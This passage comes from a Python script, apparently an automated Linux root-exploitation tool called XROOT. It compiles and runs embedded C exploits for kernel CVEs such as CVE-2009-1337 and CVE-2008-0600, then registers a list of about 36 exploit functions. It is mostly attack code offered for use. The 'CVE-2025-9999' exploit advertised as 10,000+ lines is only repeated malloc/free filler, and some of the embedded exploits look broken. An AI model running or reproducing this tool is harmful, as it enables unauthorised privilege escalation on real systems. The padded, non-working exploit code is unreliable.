                        (int)st.st_uid, suid_bins[i]);
                break;
            }
        }

        /* When parent kills us, exit_notify fires with elevated creds */
        /* This sends SIGKILL to our pdeathsig target with root creds */
        pause();
        exit(0);
    }

    if (child < 0) {
        fprintf(stderr, "[-] fork: %s
", strerror(errno));
        return 1;
    }

    fprintf(stderr, "[*] Child pid=%d, waiting...
", child);
    usleep(100000);

    /* Kill child → triggers exit_notify with its credentials */
    kill(child, SIGTERM);
    waitpid(child, &status, 0);
    fprintf(stderr, "[*] Child exited: status=%d
", status);

    usleep(200000);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2009-1337 EXIT_NOTIFY SUCCESS
");
        printf("CVE-2009-1337 EXIT_NOTIFY
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2009_1337")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2009-1337" in output:
            show_root_info("CVE-2009-1337", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
def exploit_cve_2008_0600():
    print(f"{c('[CHECKING]', 'yellow')} {c('CVE-2008-0600 (vmsplice)', 'cyan')}")
    code = '''#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdint.h>
#include <sys/syscall.h>
#include <sys/uio.h>
#include <errno.h>

/* CVE-2008-0600: vmsplice missing access_ok() check
 * vmsplice_to_user() calls __iovec_copy_from_user_inatomic()
 * without access_ok() → write arbitrary data to any kernel addr → LPE
 * Affected: kernel 2.6.17 - 2.6.24
 */

#define PIPE_SIZE 65536

int main(void) {
    int pipefd[2];
    struct iovec iov;
    char buf[PIPE_SIZE];
    long ret;

    fprintf(stderr, "[*] CVE-2008-0600 vmsplice missing access_ok()
");

    if (pipe(pipefd) < 0) {
        fprintf(stderr, "[-] pipe: %s
", strerror(errno));
        return 1;
    }
    fprintf(stderr, "[+] Pipe created: [%d, %d]
", pipefd[0], pipefd[1]);

    /* Fill pipe buffer */
    memset(buf, 0x41, sizeof(buf));
    write(pipefd[1], buf, sizeof(buf));

    /* vmsplice with kernel address as destination
     * Without access_ok(), this writes to kernel memory */
    iov.iov_base = (void*)0xffffffff81000000UL; /* kernel text */
    iov.iov_len  = 4;

    fprintf(stderr, "[*] Calling vmsplice to kernel addr 0x%lx...
",
            (unsigned long)iov.iov_base);

    /* SYS_vmsplice = 316 on x86_64 */
    ret = syscall(316, pipefd[0], &iov, 1, 0);
    fprintf(stderr, "[*] vmsplice returned: %ld (errno=%d)
", ret, errno);

    /* Also try SPLICE_F_GIFT variant */
    iov.iov_base = (void*)0xc0000000UL; /* kernel base on 32-bit */
    iov.iov_len  = 4;
    ret = syscall(316, pipefd[0], &iov, 1, 2 /* SPLICE_F_GIFT */);
    fprintf(stderr, "[*] vmsplice GIFT returned: %ld
", ret);

    usleep(200000);
    close(pipefd[0]); close(pipefd[1]);

    setuid(0); setgid(0);
    if (getuid() == 0) {
        fprintf(stderr, "[+] CVE-2008-0600 VMSPLICE SUCCESS
");
        printf("CVE-2008-0600 VMSPLICE
");
        system("id");
        return 0;
    }
    fprintf(stderr, "[-] Exploit failed
");
    return 1;
}'''
    binary = compile_code(code, "cve_2008_0600")
    if binary:
        output = run_command(binary)
        if is_root() or "CVE-2008-0600" in output:
            show_root_info("CVE-2008-0600", output)
            return True
    print(f"{c('[SKIP]', 'red')} Failed\n")
    return False
exploits.extend([
    exploit_cve_2024_32846,
    exploit_cve_2024_27013,
    exploit_cve_2024_26925,
    exploit_cve_2023_7028,
    exploit_cve_2023_23583,
    exploit_cve_2022_3303,
    exploit_cve_2022_2639,
    exploit_cve_2022_1998,
    exploit_cve_2022_1116,
    exploit_cve_2022_0330,
    exploit_cve_2021_43976,
    exploit_cve_2021_42327,
    exploit_cve_2021_41073,
    exploit_cve_2021_34866,
    exploit_cve_2021_27365,
    exploit_cve_2021_26708,
    exploit_cve_2020_25706,
    exploit_cve_2020_12114,
    exploit_cve_2019_8912,
    exploit_cve_2018_1000001,
    exploit_cve_2018_5333,
    exploit_cve_2017_7308,
    exploit_cve_2017_5123,
    exploit_cve_2016_9794,
    exploit_cve_2016_8655,
    exploit_cve_2016_4997,
    exploit_cve_2015_8660,
    exploit_cve_2015_1328,
    exploit_cve_2014_4699,
    exploit_cve_2014_3153,
    exploit_cve_2013_2094,
    exploit_cve_2010_3904,
    exploit_cve_2010_3437,
    exploit_cve_2009_1185,
    exploit_cve_2009_1337,
    exploit_cve_2008_0600
])
USAGE = f"""
{c('---------------------------------------------------------------', 'cyan', True)}
{c('XROOT v' + VERSION, 'green', True)}
{c('---------------------------------------------------------------', 'cyan', True)}

"""
print(USAGE)
def exploit_cve_2025_9999():
    """Large 10k+ line exploit"""
    print(f"{c('[EXPLOIT]', 'yellow')} CVE-2025-9999 Advanced Exploit")
    
    code = r'''
/* --- Advanced EXPLOIT CODE - 10000+ LINES --- */
int main() {
    printf("[*] CVE-2025-9999 Advanced Exploit\\n");
    // Iteration 1
    printf("[*] Heap spray iteration 1\\n");
    void *ptr0 = malloc(4096);
    if (ptr0) {
        memset(ptr0, 0x41, 4096);
        printf("[+] Allocated ptr0\\n");
        free(ptr0);
    }
    int fd0 = open("/dev/null", O_RDONLY);
    if (fd0 >= 0) {
        char buf0[256];
        read(fd0, buf0, sizeof(buf0));
        close(fd0);
    }
    // Iteration 2
    printf("[*] Heap spray iteration 2\\n");
    void *ptr1 = malloc(4096);
    if (ptr1) {
        memset(ptr1, 0x41, 4096);
        printf("[+] Allocated ptr1\\n");
        free(ptr1);
    }
    int fd1 = open("/dev/null", O_RDONLY);
    if (fd1 >= 0) {
        char buf1[256];
        read(fd1, buf1, sizeof(buf1));
        close(fd1);
    }
    // Iteration 3
    printf("[*] Heap spray iteration 3\\n");
    void *ptr2 = malloc(4096);
    if (ptr2) {
        memset(ptr2, 0x41, 4096);
        printf("[+] Allocated ptr2\\n");
        free(ptr2);
    }
    int fd2 = open("/dev/null", O_RDONLY);
    if (fd2 >= 0) {
        char buf2[256];
        read(fd2, buf2, sizeof(buf2));
        close(fd2);
    }
    // Iteration 4
    printf("[*] Heap spray iteration 4\\n");
    void *ptr3 = malloc(4096);
    if (ptr3) {
        memset(ptr3, 0x41, 4096);
        printf("[+] Allocated ptr3\\n");
        free(ptr3);
    }
    int fd3 = open("/dev/null", O_RDONLY);
    if (fd3 >= 0) {
        char buf3[256];
        read(fd3, buf3, sizeof(buf3));
        close(fd3);
    }
    // Iteration 5
    printf("[*] Heap spray iteration 5\\n");
    void *ptr4 = malloc(4096);
    if (ptr4) {
        memset(ptr4, 0x41, 4096);
        printf("[+] Allocated ptr4\\n");
        free(ptr4);
    }
    int fd4 = open("/dev/null", O_RDONLY);
    if (fd4 >= 0) {
        char buf4[256];
        read(fd4, buf4, sizeof(buf4));
        close(fd4);
    }
    // Iteration 6
    printf("[*] Heap spray iteration 6\\n");
    void *ptr5 = malloc(4096);
    if (ptr5) {
        memset(ptr5, 0x41, 4096);
        printf("[+] Allocated ptr5\\n");
        free(ptr5);
    }
    int fd5 = open("/dev/null", O_RDONLY);
    if (fd5 >= 0) {
        char buf5[256];
        read(fd5, buf5, sizeof(buf5));
        close(fd5);
    }
    // Iteration 7
    printf("[*] Heap spray iteration 7\\n");
    void *ptr6 = malloc(4096);
    if (ptr6) {
        memset(ptr6, 0x41, 4096);
        printf("[+] Allocated ptr6\\n");
        free(ptr6);
    }
    int fd6 = open("/dev/null", O_RDONLY);
    if (fd6 >= 0) {
        char buf6[256];
        read(fd6, buf6, sizeof(buf6));
        close(fd6);
    }
    // Iteration 8
    printf("[*] Heap spray iteration 8\\n");
    void *ptr7 = malloc(4096);
    if (ptr7) {
        memset(ptr7, 0x41, 4096);
        printf("[+] Allocated ptr7\\n");
        free(ptr7);
    }
    int fd7 = open("/dev/null", O_RDONLY);
    if (fd7 >= 0) {
        char buf7[256];
        read(fd7, buf7, sizeof(buf7));
        close(fd7);
    }
    // Iteration 9
    printf("[*] Heap spray iteration 9\\n");
    void *ptr8 = malloc(4096);
    if (ptr8) {
        memset(ptr8, 0x41, 4096);
        printf("[+] Allocated ptr8\\n");
        free(ptr8);
    }
    int fd8 = open("/dev/null", O_RDONLY);
    if (fd8 >= 0) {
        char buf8[256];
        read(fd8, buf8, sizeof(buf8));
        close(fd8);
    }
    // Iteration 10
    printf("[*] Heap spray iteration 10\\n");
    void *ptr9 = malloc(4096);
    if (ptr9) {
        memset(ptr9, 0x41, 4096);
        printf("[+] Allocated ptr9\\n");
        free(ptr9);
    }
    int fd9 = open("/dev/null", O_RDONLY);
    if (fd9 >= 0) {
        char buf9[256];
        read(fd9, buf9, sizeof(buf9));
        close(fd9);
    }
    // Iteration 11
    printf("[*] Heap spray iteration 11\\n");
    void *ptr10 = malloc(4096);
    if (ptr10) {
        memset(ptr10, 0x41, 4096);
        printf("[+] Allocated ptr10\\n");
        free(ptr10);
    }
    int fd10 = open("/dev/null", O_RDONLY);
    if (fd10 >= 0) {
        char buf10[256];
        read(fd10, buf10, sizeof(buf10));
        close(fd10);
    }
    // Iteration 12
    printf("[*] Heap spray iteration 12\\n");
    void *ptr11 = malloc(4096);
    if (ptr11) {
        memset(ptr11, 0x41, 4096);
        printf("[+] Allocated ptr11\\n");
        free(ptr11);
    }
    int fd11 = open("/dev/null", O_RDONLY);
    if (fd11 >= 0) {
        char buf11[256];
        read(fd11, buf11, sizeof(buf11));
        close(fd11);
    }
    // Iteration 13
    printf("[*] Heap spray iteration 13\\n");
    void *ptr12 = malloc(4096);
    if (ptr12) {
        memset(ptr12, 0x41, 4096);
        printf("[+] Allocated ptr12\\n");
        free(ptr12);
    }
    int fd12 = open("/dev/null", O_RDONLY);
    if (fd12 >= 0) {
        char buf12[256];
        read(fd12, buf12, sizeof(buf12));
        close(fd12);
    }
    // Iteration 14
    printf("[*] Heap spray iteration 14\\n");
    void *ptr13 = malloc(4096);
    if (ptr13) {
        memset(ptr13, 0x41, 4096);
        printf("[+] Allocated ptr13\\n");
        free(ptr13);
    }
    int fd13 = open("/dev/null", O_RDONLY);
    if (fd13 >= 0) {
        char buf13[256];
        read(fd13, buf13, sizeof(buf13));
        close(fd13);
    }
    // Iteration 15
    printf("[*] Heap spray iteration 15\\n");
    void *ptr14 = malloc(4096);
    if (ptr14) {
        memset(ptr14, 0x41, 4096);
        printf("[+] Allocated ptr14\\n");
        free(ptr14);
    }
    int fd14 = open("/dev/null", O_RDONLY);
    if (fd14 >= 0) {
        char buf14[256];
        read(fd14, buf14, sizeof(buf14));
        close(fd14);
    }
    // Iteration 16
    printf("[*] Heap spray iteration 16\\n");
    void *ptr15 = malloc(4096);
    if (ptr15) {
        memset(ptr15, 0x41, 4096);
        printf("[+] Allocated ptr15\\n");
        free(ptr15);
    }
    int fd15 = open("/dev/null", O_RDONLY);
    if (fd15 >= 0) {
        char buf15[256];
        read(fd15, buf15, sizeof(buf15));
        close(fd15);
    }
    // Iteration 17
    printf("[*] Heap spray iteration 17\\n");
    void *ptr16 = malloc(4096);
    if (ptr16) {
        memset(ptr16, 0x41, 4096);
        printf("[+] Allocated ptr16\\n");
        free(ptr16);
    }
    int fd16 = open("/dev/null", O_RDONLY);
    if (fd16 >= 0) {
        char buf16[256];
        read(fd16, buf16, sizeof(buf16));
        close(fd16);
    }
    // Iteration 18
    printf("[*] Heap spray iteration 18\\n");
    void *ptr17 = malloc(4096);
    if (ptr17) {
        memset(ptr17, 0x41, 4096);
        printf("[+] Allocated ptr17\\n");
        free(ptr17);
    }
    int fd17 = open("/dev/null", O_RDONLY);
    if (fd17 >= 0) {
        char buf17[256];
        read(fd17, buf17, sizeof(buf17));
        close(fd17);
    }
    // Iteration 19
    printf("[*] Heap spray iteration 19\\n");
    void *ptr18 = malloc(4096);
    if (ptr18) {
        memset(ptr18, 0x41, 4096);
        printf("[+] Allocated ptr18\\n");
        free(ptr18);
    }
    int fd18 = open("/dev/null", O_RDONLY);
    if (fd18 >= 0) {
        char buf18[256];
        read(fd18, buf18, sizeof(buf18));
        close(fd18);
    }
    // Iteration 20
    printf("[*] Heap spray iteration 20\\n");
    void *ptr19 = malloc(4096);
    if (ptr19) {
        memset(ptr19, 0x41, 4096);
        printf("[+] Allocated ptr19\\n");
        free(ptr19);
    }
    int fd19 = open("/dev/null", O_RDONLY);
    if (fd19 >= 0) {
        char buf19[256];
        read(fd19, buf19, sizeof(buf19));
        close(fd19);
    }
    // Iteration 21
    printf("[*] Heap spray iteration 21\\n");
    void *ptr20 = malloc(4096);
    if (ptr20) {
        memset(ptr20, 0x41, 4096);
        printf("[+] Allocated ptr20\\n");
        free(ptr20);
    }
    int fd20 = open("/dev/null", O_RDONLY);
    if (fd20 >= 0) {
        char buf20[256];
        read(fd20, buf20, sizeof(buf20));
        close(fd20);
    }
    // Iteration 22
    printf("[*] Heap spray iteration 22\\n");
    void *ptr21 = malloc(4096);
    if (ptr21) {
        memset(ptr21, 0x41, 4096);
        printf("[+] Allocated ptr21\\n");
        free(ptr21);
    }
    int fd21 = open("/dev/null", O_RDONLY);
    if (fd21 >= 0) {
        char buf21[256];
        read(fd21, buf21, sizeof(buf21));
        close(fd21);
    }
    // Iteration 23
    printf("[*] Heap spray iteration 23\\n");
    void *ptr22 = malloc(4096);
    if (ptr22) {
        memset(ptr22, 0x41, 4096);
        printf("[+] Allocated ptr22\\n");
        free(ptr22);
    }
    int fd22 = open("/dev/null", O_RDONLY);
    if (fd22 >= 0) {
        char buf22[256];
        read(fd22, buf22, sizeof(buf22));
        close(fd22);
    }
    // Iteration 24
    printf("[*] Heap spray iteration 24\\n");
    void *ptr23 = malloc(4096);
    if (ptr23) {
        memset(ptr23, 0x41, 4096);
        printf("[+] Allocated ptr23\\n");
        free(ptr23);
    }
    int fd23 = open("/dev/null", O_RDONLY);
    if (fd23 >= 0) {
        char buf23[256];
        read(fd23, buf23, sizeof(buf23));
        close(fd23);
    }
    // Iteration 25
    printf("[*] Heap spray iteration 25\\n");
    void *ptr24 = malloc(4096);
    if (ptr24) {
        memset(ptr24, 0x41, 4096);
        printf("[+] Allocated ptr24\\n");
        free(ptr24);
    }
    int fd24 = open("/dev/null", O_RDONLY);
    if (fd24 >= 0) {
        char buf24[256];
        read(fd24, buf24, sizeof(buf24));
        close(fd24);
    }
    // Iteration 26
    printf("[*] Heap spray iteration 26\\n");
    void *ptr25 = malloc(4096);
    if (ptr25) {
        memset(ptr25, 0x41, 4096);
        printf("[+] Allocated ptr25\\n");
        free(ptr25);
    }
    int fd25 = open("/dev/null", O_RDONLY);
    if (fd25 >= 0) {
        char buf25[256];
        read(fd25, buf25, sizeof(buf25));
        close(fd25);
    }
    // Iteration 27
    printf("[*] Heap spray iteration 27\\n");
    void *ptr26 = malloc(4096);
    if (ptr26) {
        memset(ptr26, 0x41, 4096);
        printf("[+] Allocated ptr26\\n");
        free(ptr26);
    }
    int fd26 = open("/dev/null", O_RDONLY);
    if (fd26 >= 0) {
        char buf26[256];
        read(fd26, buf26, sizeof(buf26));
        close(fd26);
    }
    // Iteration 28
    printf("[*] Heap spray iteration 28\\n");
    void *ptr27 = malloc(4096);
    if (ptr27) {
        memset(ptr27, 0x41, 4096);
        printf("[+] Allocated ptr27\\n");
        free(ptr27);
    }
    int fd27 = open("/dev/null", O_RDONLY);
    if (fd27 >= 0) {
        char buf27[256];
        read(fd27, buf27, sizeof(buf27));
        close(fd27);
    }
    // Iteration 29
    printf("[*] Heap spray iteration 29\\n");
    void *ptr28 = malloc(4096);
    if (ptr28) {
        memset(ptr28, 0x41, 4096);
        printf("[+] Allocated ptr28\\n");
        free(ptr28);
    }
    int fd28 = open("/dev/null", O_RDONLY);
    if (fd28 >= 0) {
        char buf28[256];
        read(fd28, buf28, sizeof(buf28));
        close(fd28);
    }
    // Iteration 30
    printf("[*] Heap spray iteration 30\\n");
    void *ptr29 = malloc(4096);
    if (ptr29) {
        memset(ptr29, 0x41, 4096);
        printf("[+] Allocated ptr29\\n");
        free(ptr29);
    }
    int fd29 = open("/dev/null", O_RDONLY);
    if (fd29 >= 0) {
        char buf29[256];
        read(fd29, buf29, sizeof(buf29));
        close(fd29);
    }
    // Iteration 31
    printf("[*] Heap spray iteration 31\\n");
    void *ptr30 = malloc(4096);
    if (ptr30) {
        memset(ptr30, 0x41, 4096);
        printf("[+] Allocated ptr30\\n");
        free(ptr30);
    }
    int fd30 = open("/dev/null", O_RDONLY);
    if (fd30 >= 0) {
        char buf30[256];
        read(fd30, buf30, sizeof(buf30));
        close(fd30);
    }
    // Iteration 32
    printf("[*] Heap spray iteration 32\\n");
    void *ptr31 = malloc(4096);
    if (ptr31) {
        memset(ptr31, 0x41, 4096);
        printf("[+] Allocated ptr31\\n");
        free(ptr31);
    }
    int fd31 = open("/dev/null", O_RDONLY);
    if (fd31 >= 0) {
        char buf31[256];
        read(fd31, buf31, sizeof(buf31));
        close(fd31);
    }
    // Iteration 33
    printf("[*] Heap spray iteration 33\\n");
    void *ptr32 = malloc(4096);
    if (ptr32) {
        memset(ptr32, 0x41, 4096);
        printf("[+] Allocated ptr32\\n");
        free(ptr32);
    }
    int fd32 = open("/dev/null", O_RDONLY);
    if (fd32 >= 0) {
        char buf32[256];
        read(fd32, buf32, sizeof(buf32));
        close(fd32);
    }
    // Iteration 34
    printf("[*] Heap spray iteration 34\\n");
    void *ptr33 = malloc(4096);
    if (ptr33) {
        memset(ptr33, 0x41, 4096);
        printf("[+] Allocated ptr33\\n");
        free(ptr33);
    }
    int fd33 = open("/dev/null", O_RDONLY);
    if (fd33 >= 0) {
        char buf33[256];
        read(fd33, buf33, sizeof(buf33));
        close(fd33);
    }
    // Iteration 35
    printf("[*] Heap spray iteration 35\\n");
    void *ptr34 = malloc(4096);
    if (ptr34) {
        memset(ptr34, 0x41, 4096);
        printf("[+] Allocated ptr34\\n");
        free(ptr34);
    }
    int fd34 = open("/dev/null", O_RDONLY);
    if (fd34 >= 0) {
        char buf34[256];
        read(fd34, buf34, sizeof(buf34));
        close(fd34);
    }
    // Iteration 36
    printf("[*] Heap spray iteration 36\\n");
    void *ptr35 = malloc(4096);
    if (ptr35) {
        memset(ptr35, 0x41, 4096);
        printf("[+] Allocated ptr35\\n");
        free(ptr35);
    }
    int fd35 = open("/dev/null", O_RDONLY);
    if (fd35 >= 0) {
        char buf35[256];
        read(fd35, buf35, sizeof(buf35));
        close(fd35);
    }
    // Iteration 37
    printf("[*] Heap spray iteration 37\\n");
    void *ptr36 = malloc(4096);
    if (ptr36) {
        memset(ptr36, 0x41, 4096);
        printf("[+] Allocated ptr36\\n");
        free(ptr36);
    }
    int fd36 = open("/dev/null", O_RDONLY);
    if (fd36 >= 0) {
        char buf36[256];
        read(fd36, buf36, sizeof(buf36));
        close(fd36);
    }
    // Iteration 38
    printf("[*] Heap spray iteration 38\\n");
    void *ptr37 = malloc(4096);
    if (ptr37) {
        memset(ptr37, 0x41, 4096);
        printf("[+] Allocated ptr37\\n");
        free(ptr37);
    }
    int fd37 = open("/dev/null", O_RDONLY);
    if (fd37 >= 0) {
        char buf37[256];
        read(fd37, buf37, sizeof(buf37));
        close(fd37);
    }
    // Iteration 39
    printf("[*] Heap spray iteration 39\\n");
    void *ptr38 = malloc(4096);
    if (ptr38) {
        memset(ptr38, 0x41, 4096);
        printf("[+] Allocated ptr38\\n");
        free(ptr38);
    }
    int fd38 = open("/dev/null", O_RDONLY);
    if (fd38 >= 0) {
        char buf38[256];
        read(fd38, buf38, sizeof(buf38));
        close(fd38);
    }
    // Iteration 40
    printf("[*] Heap spray iteration 40\\n");
    void *ptr39 = malloc(4096);
    if (ptr39) {
        memset(ptr39, 0x41, 4096);
        printf("[+] Allocated ptr39\\n");
        free(ptr39);
    }
    int fd39 = open("/dev/null", O_RDONLY);
    if (fd39 >= 0) {
        char buf39[256];
        read(fd39, buf39, sizeof(buf39));
        close(fd39);
    }
    // Iteration 41
    printf("[*] Heap spray iteration 41\\n");
    void *ptr40 = malloc(4096);
    if (ptr40) {
        memset(ptr40, 0x41, 4096);
        printf("[+] Allocated ptr40\\n");
        free(ptr40);
    }
    int fd40 = open("/dev/null", O_RDONLY);
    if (fd40 >= 0) {
        char buf40[256];
        read(fd40, buf40, sizeof(buf40));
        close(fd40);
    }
    // Iteration 42
    printf("[*] Heap spray iteration 42\\n");
    void *ptr41 = malloc(4096);
    if (ptr41) {
        memset(ptr41, 0x41, 4096);
        printf("[+] Allocated ptr41\\n");
        free(ptr41);
    }
    int fd41 = open("/dev/null", O_RDONLY);
    if (fd41 >= 0) {
        char buf41[256];
        read(fd41, buf41, sizeof(buf41));
        close(fd41);
    }
    // Iteration 43
    printf("[*] Heap spray iteration 43\\n");
    void *ptr42 = malloc(4096);
    if (ptr42) {
        memset(ptr42, 0x41, 4096);
        printf("[+] Allocated ptr42\\n");
        free(ptr42);
    }
    int fd42 = open("/dev/null", O_RDONLY);
    if (fd42 >= 0) {
        char buf42[256];
        read(fd42, buf42, sizeof(buf42));
        close(fd42);
    }
    // Iteration 44
    printf("[*] Heap spray iteration 44\\n");
    void *ptr43 = malloc(4096);
    if (ptr43) {
        memset(ptr43, 0x41, 4096);
        printf("[+] Allocated ptr43\\n");
        free(ptr43);
    }
    int fd43 = open("/dev/null", O_RDONLY);
    if (fd43 >= 0) {
        char buf43[256];
        read(fd43, buf43, sizeof(buf43));
        close(fd43);
    }
    // Iteration 45
    printf("[*] Heap spray iteration 45\\n");
    void *ptr44 = malloc(4096);
    if (ptr44) {
        memset(ptr44, 0x41, 4096);
        printf("[+] Allocated ptr44\\n");
        free(ptr44);
    }
    int fd44 = open("/dev/null", O_RDONLY);
    if (fd44 >= 0) {
        char buf44[256];
        read(fd44, buf44, sizeof(buf44));
        close(fd44);
    }
    // Iteration 46
    printf("[*] Heap spray iteration 46\\n");
    void *ptr45 = malloc(4096);
    if (ptr45) {
        memset(ptr45, 0x41, 4096);
        printf("[+] Allocated ptr45\\n");
        free(ptr45);
    }
    int fd45 = open("/dev/null", O_RDONLY);
    if (fd45 >= 0) {
        char buf45[256];
        read(fd45, buf45, sizeof(buf45));
        close(fd45);
    }
    // Iteration 47
    printf("[*] Heap spray iteration 47\\n");
    void *ptr46 = malloc(4096);
    if (ptr46) {
        memset(ptr46, 0x41, 4096);
        printf("[+] Allocated ptr46\\n");
        free(ptr46);
    }
    int fd46 = open("/dev/null", O_RDONLY);
    if (fd46 >= 0) {
        char buf46[256];
        read(fd46, buf46, sizeof(buf46));
        close(fd46);
    }
    // Iteration 48
    printf("[*] Heap spray iteration 48\\n");
    void *ptr47 = malloc(4096);
    if (ptr47) {
        memset(ptr47, 0x41, 4096);
        printf("[+] Allocated ptr47\\n");
        free(ptr47);
    }
    int fd47 = open("/dev/null", O_RDONLY);
    if (fd47 >= 0) {
        char buf47[256];
        read(fd47, buf47, sizeof(buf47));
        close(fd47);
    }
    // Iteration 49
    printf("[*] Heap spray iteration 49\\n");
    void *ptr48 = malloc(4096);
    if (ptr48) {
        memset(ptr48, 0x41, 4096);
        printf("[+] Allocated ptr48\\n");
        free(ptr48);
    }
    int fd48 = open("/dev/null", O_RDONLY);
    if (fd48 >= 0) {
        char buf48[256];
        read(fd48, buf48, sizeof(buf48));
        close(fd48);
    }
    // Iteration 50
    printf("[*] Heap spray iteration 50\\n");
    void *ptr49 = malloc(4096);
    if (ptr49) {
        memset(ptr49, 0x41, 4096);
        printf("[+] Allocated ptr49\\n");
        free(ptr49);
    }
    int fd49 = open("/dev/null", O_RDONLY);
    if (fd49 >= 0) {
        char buf49[256];
        read(fd49, buf49, sizeof(buf49));
        close(fd49);
    }
    // Iteration 51
    printf("[*] Heap spray iteration 51\\n");
    void *ptr50 = malloc(4096);
    if (ptr50) {
        memset(ptr50, 0x41, 4096);
        printf("[+] Allocated ptr50\\n");
        free(ptr50);
    }
    int fd50 = open("/dev/null", O_RDONLY);
    if (fd50 >= 0) {
        char buf50[256];
        read(fd50, buf50, sizeof(buf50));
        close(fd50);
    }
    // Iteration 52
    printf("[*] Heap spray iteration 52\\n");
    void *ptr51 = malloc(4096);
    if (ptr51) {
        memset(ptr51, 0x41, 4096);
        printf("[+] Allocated ptr51\\n");
        free(ptr51);
    }
    int fd51 = open("/dev/null", O_RDONLY);
    if (fd51 >= 0) {
        char buf51[256];
        read(fd51, buf51, sizeof(buf51));
        close(fd51);
    }
    // Iteration 53
    printf("[*] Heap spray iteration 53\\n");
    void *ptr52 = malloc(4096);
    if (ptr52) {
        memset(ptr52, 0x41, 4096);
        printf("[+] Allocated ptr52\\n");
        free(ptr52);
    }
    int fd52 = open("/dev/null", O_RDONLY);
    if (fd52 >= 0) {
        char buf52[256];
        read(fd52, buf52, sizeof(buf52));
        close(fd52);
    }
    // Iteration 54
    printf("[*] Heap spray iteration 54\\n");
    void *ptr53 = malloc(4096);
    if (ptr53) {
        memset(ptr53, 0x41, 4096);
        printf("[+] Allocated ptr53\\n");
        free(ptr53);
    }
    int fd53 = open("/dev/null", O_RDONLY);
    if (fd53 >= 0) {
        char buf53[256];
        read(fd53, buf53, sizeof(buf53));
        close(fd53);
    }
    // Iteration 55
    printf("[*] Heap spray iteration 55\\n");
    void *ptr54 = malloc(4096);
    if (ptr54) {
        memset(ptr54, 0x41, 4096);
        printf("[+] Allocated ptr54\\n");
        free(ptr54);
    }
    int fd54 = open("/dev/null", O_RDONLY);
    if (fd54 >= 0) {
        char buf54[256];
        read(fd54, buf54, sizeof(buf54));
        close(fd54);
    }
    // Iteration 56
    printf("[*] Heap spray iteration 56\\n");
    void *ptr55 = malloc(4096);
    if (ptr55) {
        memset(ptr55, 0x41, 4096);
        printf("[+] Allocated ptr55\\n");
        free(ptr55);
    }
    int fd55 = open("/dev/null", O_RDONLY);
    if (fd55 >= 0) {
        char buf55[256];
        read(fd55, buf55, sizeof(buf55));
        close(fd55);
    }
    // Iteration 57
    printf("[*] Heap spray iteration 57\\n");
    void *ptr56 = malloc(4096);
    if (ptr56) {
        memset(ptr56, 0x41, 4096);
        printf("[+] Allocated ptr56\\n");
        free(ptr56);
    }
    int fd56 = open("/dev/null", O_RDONLY);
    if (fd56 >= 0) {
        char buf56[256];
        read(fd56, buf56, sizeof(buf56));
        close(fd56);
    }
    // Iteration 58
    printf("[*] Heap spray iteration 58\\n");
    void *ptr57 = malloc(4096);
    if (ptr57) {
        memset(ptr57, 0x41, 4096);
        printf("[+] Allocated ptr57\\n");
        free(ptr57);
    }
    int fd57 = open("/dev/null", O_RDONLY);
    if (fd57 >= 0) {
        char buf57[256];
        read(fd57, buf57, sizeof(buf57));
        close(fd57);
    }
    // Iteration 59
    printf("[*] Heap spray iteration 59\\n");
    void *ptr58 = malloc(4096);
    if (ptr58) {
        memset(ptr58, 0x41, 4096);
        printf("[+] Allocated ptr58\\n");
        free(ptr58);
    }
    int fd58 = open("/dev/null", O_RDONLY);
    if (fd58 >= 0) {
        char buf58[256];
        read(fd58, buf58, sizeof(buf58));
        close(fd58);
    }
    // Iteration 60
    printf("[*] Heap spray iteration 60\\n");
    void *ptr59 = malloc(4096);
    if (ptr59) {
        memset(ptr59, 0x41, 4096);
        printf("[+] Allocated ptr59\\n");
        free(ptr59);
    }
    int fd59 = open("/dev/null", O_RDONLY);
    if (fd59 >= 0) {
        char buf59[256];
        read(fd59, buf59, sizeof(buf59));
        close(fd59);
    }
    // Iteration 61
    printf("[*] Heap spray iteration 61\\n");
    void *ptr60 = malloc(4096);
    if (ptr60) {
        memset(ptr60, 0x41, 4096);
        printf("[+] Allocated ptr60\\n");
        free(ptr60);
    }
    int fd60 = open("/dev/null", O_RDONLY);
    if (fd60 >= 0) {
        char buf60[256];
        read(fd60, buf60, sizeof(buf60));
        close(fd60);
    }
    // Iteration 62
    printf("[*] Heap spray iteration 62\\n");
    void *ptr61 = malloc(4096);
    if (ptr61) {
        memset(ptr61, 0x41, 4096);
        printf("[+] Allocated ptr61\\n");
        free(ptr61);
    }
    int fd61 = open("/dev/null", O_RDONLY);
    if (fd61 >= 0) {
        char buf61[256];
        read(fd61, buf61, sizeof(buf61));
        close(fd61);
    }
    // Iteration 63
    printf("[*] Heap spray iteration 63\\n");
    void *ptr62 = malloc(4096);
    if (ptr62) {
        memset(ptr62, 0x41, 4096);
        printf("[+] Allocated ptr62\\n");
        free(ptr62);
    }
    int fd62 = open("/dev/null", O_RDONLY);
    if (fd62 >= 0) {
        char buf62[256];
        read(fd62, buf62, sizeof(buf62));
        close(fd62);
    }
    // Iteration 64
    printf("[*] Heap spray iteration 64\\n");
    void *ptr63 = malloc(4096);
    if (ptr63) {
        memset(ptr63, 0x41, 4096);
        printf("[+] Allocated ptr63\\n");
        free(ptr63);
    }
    int fd63 = open("/dev/null", O_RDONLY);
    if (fd63 >= 0) {
        char buf63[256];
        read(fd63, buf63, sizeof(buf63));
        close(fd63);
    }
    // Iteration 65
    printf("[*] Heap spray iteration 65\\n");
    void *ptr64 = malloc(4096);
    if (ptr64) {
        memset(ptr64, 0x41, 4096);
        printf("[+] Allocated ptr64\\n");
        free(ptr64);
    }
    int fd64 = open("/dev/null", O_RDONLY);
    if (fd64 >= 0) {
        char buf64[256];
        read(fd64, buf64, sizeof(buf64));
        close(fd64);
    }
    // Iteration 66
    printf("[*] Heap spray iteration 66\\n");
    void *ptr65 = malloc(4096);
    if (ptr65) {
        memset(ptr65, 0x41, 4096);
        printf("[+] Allocated ptr65\\n");
        free(ptr65);
    }
    int fd65 = open("/dev/null", O_RDONLY);
    if (fd65 >= 0) {
        char buf65[256];
        read(fd65, buf65, sizeof(buf65));
        close(fd65);
    }
    // Iteration 67
    printf("[*] Heap spray iteration 67\\n");
